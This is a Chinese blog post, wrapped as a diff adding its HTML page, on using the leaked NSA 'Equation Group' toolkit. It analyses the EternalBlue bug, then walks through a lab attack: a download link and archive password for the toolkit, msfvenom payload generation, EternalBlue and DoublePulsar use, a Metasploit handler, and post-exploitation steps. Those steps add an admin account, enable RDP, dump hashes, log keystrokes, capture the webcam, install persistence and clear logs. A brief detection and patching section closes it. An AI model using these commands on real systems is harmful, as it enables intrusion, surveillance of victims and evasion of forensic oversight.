@@ -1,0 +1,1292 @@
+<!DOCTYPE html>
+<html  lang="en">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 4.2.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>NSA方程式工具利用与分析 - Lithium</title>
+
+
+    <meta name="description" content="前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSA方程式工具利用与分析">
+<meta property="og:url" content="https://p0st3r.github.io/2017/04/28/NSA-tools/index.html">
+<meta property="og:site_name" content="Lithium">
+<meta property="og:description" content="前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://p0st3r.github.io/images/og_image.png">
+<meta property="article:published_time" content="2017-04-27T20:11:03.000Z">
+<meta property="article:modified_time" content="2019-05-09T02:07:52.129Z">
+<meta property="article:author" content="Lithium Atom">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p0st3r.github.io/images/og_image.png">
+
+
+
+<link rel="canonical" href="https://p0st3r.github.io" />
+
+
+
+<link rel="alternative" href="/lithium.xml" title="NSA方程式工具利用与分析" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-dark.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="NSA方程式工具利用与分析" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Hme</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="Search" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <i class="fas fa-calendar-alt"></i>&nbsp;
+                <time class="level-item has-text-grey" datetime="2017-04-27T20:11:03.000Z">2017-04-28</time>
+                <i class="fas fa-archive"></i>&nbsp;
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/hack/">hack</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    <i class="fas fa-clock"></i>&nbsp;
+                    
+                    12 minutes read (About 1846 words)
+                </span>
+                
+                
+                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                    <i class="far fa-eye"></i>
+                    <span id="busuanzi_value_page_pv">0</span> visits
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                NSA方程式工具利用与分析
+            
+        </h1>
+        <div class="content">
+            <p>前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0，任何人都可以直接下载并远程攻击利用。</p>
+<a id="more"></a>
+
+<h1 id="Shadowbroker"><a href="#Shadowbroker" class="headerlink" title="Shadowbroker"></a>Shadowbroker</h1><p>下载地址</p>
+<p><a href="https://yadi.sk/d/NJqzpqo_3GxZA4">https://yadi.sk/d/NJqzpqo_3GxZA4</a></p>
+<p><strong>解压密码</strong>：Reeeeeeeeeeeeeee</p>
+<p><strong>github下载地址</strong>：<a href="http://link.zhihu.com/?target=https%3A//github.com/misterch0c/shadowbroker">https://github.com/misterch0c/shadowbroker</a></p>
+<p>释放的工具总共包含三个文件夹，</p>
+<ul>
+<li>Swift：包含了NSA对SWIFT银行系统发动攻击的相关证据，其中有EastNets的一些PPT文档、相关的证据、一些登录凭证和内部架构，EastNets是中东最大的SWIFT服务机构之一。</li>
+<li>OddJob：包含一个基于Windows的植入软件，并包括所指定的配置文件和payload。适用于Windows Server 2003 Enterprise（甚至Windows XP Professional）</li>
+<li>Windows：包含对Windows操作系统的许多黑客工具，但主要针对的是较旧版本的Windows（Windows XP中）和Server 2003。</li>
+</ul>
+<h1 id="主要工具"><a href="#主要工具" class="headerlink" title="主要工具"></a>主要工具</h1><h2 id="FUZZBUNCH：一款类似Metasploit的Exploit框架"><a href="#FUZZBUNCH：一款类似Metasploit的Exploit框架" class="headerlink" title="FUZZBUNCH：一款类似Metasploit的Exploit框架"></a><em>FUZZBUNCH</em>：一款类似Metasploit的Exploit框架</h2><p>模块==&gt;漏洞==&gt;影响系统==&gt;默认端口</p>
+<ol>
+<li>Easypi ==&gt; IBM Lotus Notes漏洞==&gt;Windows NT, 2000 ,XP, 2003==&gt;3264</li>
+<li>Easybee ==&gt;MDaemon WorldClient电子邮件服务器漏洞 ==&gt;WorldClient 9.5, 9.6, 10.0, 10.1</li>
+<li>Eternalblue ==&gt;SMBv2漏洞(MS17-010) ==&gt;Windows XP(32),Windows Server 2008 R2(32/64),Windows 7(32/64) ==&gt;139/445</li>
+<li>Doublepulsar ==&gt;SMB和NBT漏洞Windows XP(32), Vista, 7, Windows Server 2003, 2008, 2008 R2 ==&gt;139/445</li>
+<li>Eternalromance ==&gt;SMBv1漏洞(MS17-010)和 NBT漏洞 ==&gt;Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2 ==&gt;139/445</li>
+<li>Eternalchampion ==&gt; SMB和NBT漏洞 ==&gt;Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2, 2012, Windows 8 SP0 ==&gt;139/445</li>
+<li>Eternalsynergy ==&gt;SMB和NBT漏洞 ==&gt;Windows 8, Windows Server 2012 ==&gt;139/445</li>
+<li>Explodingcan ==&gt;IIS6.0远程利用漏洞 ==&gt;Windows Server 2003 ==&gt;80</li>
+<li>Emphasismine ==&gt;IMAP漏洞 ==&gt;IBM Lotus Domino 6.5.4, 6.5.5, 7.0, 8.0, 8.5 ==&gt;143</li>
+<li>Ewokfrenzy ==&gt;IMAP漏洞 ==&gt;IBM Lotus Domino 6.5.4, 7.0.2== &gt;143</li>
+<li>Englishmansdentist ==&gt;SMTP漏洞==&gt; ==&gt;25</li>
+<li>Erraticgopher ==&gt;RPC漏洞 ==&gt;Windows XP SP3, Windows 2003 ==&gt;445</li>
+<li>Eskimoroll ==&gt;kerberos漏洞 ==&gt;Windows 2000, 2003, 2003 R2, 2008, 2008 R2 ==&gt;88</li>
+<li>Eclipsedwing ==&gt;MS08-067漏洞 ==&gt;Windows 2000, XP, 2003 ==&gt;139/445</li>
+<li>Educatedscholar ==&gt;MS09-050漏洞 ==&gt;Windows vista, 2008 ==&gt;445</li>
+<li>Emeraldthread ==&gt;SMB和NBT漏洞 ==&gt;Windows XP, 2003 ==&gt;139/445</li>
+<li>Zippybeer ==&gt;SMTP漏洞 ==&gt; ==&gt; 445</li>
+<li>Esteemaudit ==&gt;RDP漏洞 ==&gt;Windows XP, Windows Server 2003 ==&gt;3389</li>
+</ol>
+<h2 id="ETERNALBLUE攻击原理分析"><a href="#ETERNALBLUE攻击原理分析" class="headerlink" title="ETERNALBLUE攻击原理分析"></a><strong>ETERNALBLUE攻击原理分析</strong></h2><p>ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。</p>
+<ul>
+<li>漏洞发生处：C:\Windows\System32\drivers\srv.sys (注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。</li>
+<li>漏洞函数：unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2)</li>
+<li>触发点：_memmove(v5, (const void <em>)(a2 + 5 +</em> (_BYTE <em>)(a1 + 5)),</em> (_WORD *)(a1 + 6));</li>
+<li>原因：逻辑不正确导致的越界写入</li>
+</ul>
+<p>官方补丁修复前：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;SNIP...</span><br><span class="line">    while (v3 &#x3D; v4 || (v7 &#x3D; *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &gt; v4))</span><br><span class="line">    &#123;</span><br><span class="line">        *(WORD*)v6 &#x3D; v3 - (_DWORD)v6; &#x2F;&#x2F;&lt;----------修改处</span><br><span class="line">        return v1;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;SNIP...</span><br><span class="line">&#125;</span><br><span class="line">int __thiscall ExecuteTransaction(int this)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;SNIP...</span><br><span class="line">    if (*(_DWORD *)(v3 + 0x50) &gt;&#x3D; 1) &#x2F;&#x2F;&lt;------修改处</span><br><span class="line">    &#123;</span><br><span class="line">        _SrvSetSmbError2(0, 464, &quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&quot;);</span><br><span class="line">        SrvLogInvalidSmbDirect(v1, v10);</span><br><span class="line">        goto LABEL_109;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;SNIP...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;SNIP...</span><br><span class="line">    while (v3 &#x3D; v4 || (v7 &#x3D; *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &gt; v4))</span><br><span class="line">    &#123;</span><br><span class="line">        *(DWORD*)v6 &#x3D; v3 - (_DWORD)v6; &#x2F;&#x2F;&lt;--------修改处</span><br><span class="line">        return v1;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;SNIP...</span><br><span class="line">&#125;</span><br><span class="line">int __thiscall ExecuteTransaction(int this)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;SNIP...</span><br><span class="line">    if (*(_DWORD *)(v3 + 0x50) &gt;&#x3D; 2u) &#x2F;&#x2F;&lt;------修改处</span><br><span class="line">    &#123;</span><br><span class="line">        _SrvSetSmbError2(0, 464, &quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&quot;);</span><br><span class="line">        SrvLogInvalidSmbDirect(v1, v10);</span><br><span class="line">        goto LABEL_109;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;SNIP...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体见参考资料5</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h1><ol>
+<li><p>环境搭建</p>
+<p>| 主机类型 | OS | IP |<br>| :–: | :————: | :———-: |<br>| 攻击机1 | win2003 | 10.10.10.130 |<br>| 攻击机2 | kali linux 2.0 | 10.10.10.128 |<br>| 靶机 | winXP x86 | 10.10.10.129 |</p>
+</li>
+<li><p>工具准备</p>
+</li>
+</ol>
+<ul>
+<li><p>解压NSA工具包中的windows文件夹到攻击机1的C:\目录下（只要不是中文目录皆可）;</p>
+</li>
+<li><p>在攻击机1安装:</p>
+</li>
+<li><p><a href="http://link.zhihu.com/?target=https%3A//www.python.org/download/releases/2.6.6/">python-2.6.6.msi**</a></p>
+</li>
+<li><p><a href="http://link.zhihu.com/?target=https%3A//sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download">pywin32-221.win32-py2.6.exe**</a></p>
+</li>
+<li><p>在攻击机2先生成用于回连的dll</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;5555 -f dll &gt; x86bind.dll</span><br></pre></td></tr></table></figure>
+
+<p>3.扫描开启445端口的活跃主机并探测操作系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p445 -O 10.10.10.0&#x2F;24</span><br><span class="line">nmap -Pn -p445 -O -iL ip.txt</span><br></pre></td></tr></table></figure>
+
+<p>4.攻击机1开始利用ETERNALBLUE攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python fb.py </span><br><span class="line">use Eternalblue ...</span><br></pre></td></tr></table></figure>
+
+<p>5.利用Doublepulsar注入dll</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Doublepulsar</span><br></pre></td></tr></table></figure>
+
+<p>6.kali攻击机利用msf回连控制主机5555端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set LPORT 5555</span><br><span class="line">set RHOST XXX.XXX.XXX.XXX</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a><strong>后渗透攻击</strong></h1><ol>
+<li><p>开3389端口</p>
+<ul>
+<li><pre><code>wmic /namespace:\root\cimv2\terminalservices path 
+win32_terminalservicesetting where (__CLASS != “”) call 
+setallowtsconnections 1
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+wmic /namespace:\root\cimv2\terminalservices path 
+win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call 
+setuserauthenticationrequired 1
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">针对win XP及win2003只需要第3条命令</span><br><span class="line">针对win 7需要第1，2条命令</span><br><span class="line">针对win 2012需要3条命令</span><br><span class="line"></span><br><span class="line">1. 添加账户进管理组</span><br></pre></td></tr></table></figure>
+net user [username] [password] /add
+net localgroup Administrators [username] /add
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 端口转发如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接</span><br></pre></td></tr></table></figure>
+portfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX
+rdesktop -u root -p toor 127.0.0.1:4444
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. meterpreter自带的多功能shell</span><br><span class="line"></span><br><span class="line">   - hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文</span><br><span class="line">   - screenshot:获取屏幕截图</span><br><span class="line">   - webcam_snap:调取对方摄像头拍照</span><br><span class="line">   - keyscan_start,keyscan_dump:记录键盘动作</span><br><span class="line">   - ps:查看当前运行进程</span><br><span class="line">   - sysinfo:查看系统信息</span><br><span class="line">   - getsystem:提权</span><br><span class="line"></span><br><span class="line">4. 维持控制</span><br><span class="line"></span><br><span class="line">   - migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用</span><br><span class="line"></span><br><span class="line">   - irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态</span><br></pre></td></tr></table></figure>
+irb client.core.use(&quot;railgun) client.railgun.kernel32.SetThreadExecutionState(&quot;ES_CONTINUOUS|ES_SYSTEM_REQUIRED&quot;)
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   - background:隐藏在后台方便msf终端进行其他操作，session查看对话id</span><br><span class="line"></span><br><span class="line">   - session -i X:使用已经成功获取的对话</span><br><span class="line"></span><br><span class="line">5. 植入后门</span><br><span class="line"></span><br><span class="line">   - 测试是否虚拟机：</span><br></pre></td></tr></table></figure>
+run post/windows/gather/checkvm
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载</span><br></pre></td></tr></table></figure>
+metsrv.dll
+run metsvc
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- getgui开启远程桌面：</span><br></pre></td></tr></table></figure>
+run getgui -u sherlly -p sherlly
+run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc //清除痕迹，关闭服务，删除添加账号
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6. 清除入侵痕迹</span><br><span class="line"></span><br><span class="line">- clearev:清除日志</span><br><span class="line">- timestomp:修改文件的创建时间，最后写入和最后访问时间timestomp xiugai.doc -f old.doc</span><br><span class="line"></span><br><span class="line"># **检测&amp;防御**</span><br><span class="line"></span><br><span class="line">1. 国外有人写了个检测Doublepulsar入侵的脚本，运行环境需要python2.6, 地址</span><br><span class="line"></span><br><span class="line">   countercept&#x2F;doublepulsar-detection-script**</span><br><span class="line"></span><br><span class="line">   ，使用方法</span><br></pre></td></tr></table></figure>
+python detect_doublepulsar_smb.py --ip XXX.XXX.XXX.XXX
+python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">另外，nmap也基于该脚本出了对应扫描脚本</span><br><span class="line"></span><br><span class="line">smb-double-pulsar-backdoor.nse**</span><br><span class="line"></span><br><span class="line">，使用方法</span><br></pre></td></tr></table></figure>
+nmap -p 445 &lt;target&gt; --script=smb-double-pulsar-backdoor</code></pre></li>
+</ul>
+</li>
+<li><p>安装相应补丁<a href="http://link.zhihu.com/?target=https%3A//blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/">Protecting customers and evaluating risk**</a></p>
+</li>
+<li><p>如非必要，关闭25, 88, 139, 445, 3389端口</p>
+</li>
+<li><p>使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)</p>
+</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><ol>
+<li><a href="http://link.zhihu.com/?target=http%3A//thehackernews.com/2017/04/swift-banking-hacking-tool.html">Latest Hacking Tools Leak Indicates NSA Was Targeting SWIFT Banking Network**</a></li>
+<li><a href="http://link.zhihu.com/?target=http%3A//www.freebuf.com/sectool/132029.html">ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生 - FreeBuf.COM | 关注黑客与极客**</a></li>
+<li><a href="http://link.zhihu.com/?target=https%3A//www.cyberscoop.com/nsa-hacking-tools-shadow-brokers-dark-web-microsoft-smb/">Leaked NSA hacking tools are a hit on the dark web - CyberScoop**</a></li>
+<li><a href="http://link.zhihu.com/?target=http%3A//www.file.net/process/srv.sys.html">srv.sys Windows process - What is it?**</a></li>
+<li><a href="http://link.zhihu.com/?target=http%3A//blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/">NSA Eternalblue SMB 漏洞分析**</a></li>
+<li><a href="http://link.zhihu.com/?target=https%3A//nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html">smb-double-pulsar-backdoor NSE Script**</a></li>
+<li><a href="http://link.zhihu.com/?target=https%3A//jingyan.baidu.com/article/c843ea0b7d5c7177931e4ab1.html">如何设置Windows 7 防火墙端口规则</a></li>
+</ol>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CVE/" rel="tag">CVE</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+        <div class="social-share"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css">
+<script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">Donate a cup of coffee</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>Alipay</span>
+    <div class="qrcode"><img src="/images/no2.jpg" alt="Alipay"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>Wechat</span>
+    <div class="qrcode"><img src="/images/no.gif" alt="Wechat"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2017/05/09/JNU-Wifi-sniff/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">H3C校园网WIFI密码嗅探实验</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2017/04/20/Win-getshell-and-open-rdp/">
+                <span class="level-item">Windows服务器提权和开启3389远程连接</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">Comments</h3>
+        
+<div id="valine-thread" class="content"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#valine-thread' ,
+        notify: false,
+        verify: false,
+        app_id: 'GzbYgV54r0lAXM8EinjIWBBc-gzGzoHsz',
+        app_key: 'NoHDIIwlPBABfBSUjNMTL57g',
+        placeholder: 'Say something'
+    });
+</script>
+
+    </div>
+</div>
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="" src="/images/atom.png" alt="Lithium Atom">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        Lithium Atom
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Information security &amp; NLP
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>China</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Posts
+                    </p>
+                    <a href="/archives">
+                        <p class="title has-text-weight-normal">
+                            10
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Categories
+                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            4
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Tags
+                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            10
+                        </p>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/p0st3r" target="_blank" rel="noopener">
+                Follow</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Github" href="https://github.com/p0st3r">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Zhihu" href="https://www.zhihu.com/people/lnaif">
+                
+                <i class="fab fa-zhihu"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Email" href="mailto:dhakkan@foxmail.com">
+                
+                <i class="fas fa-envelope"></i>
+                
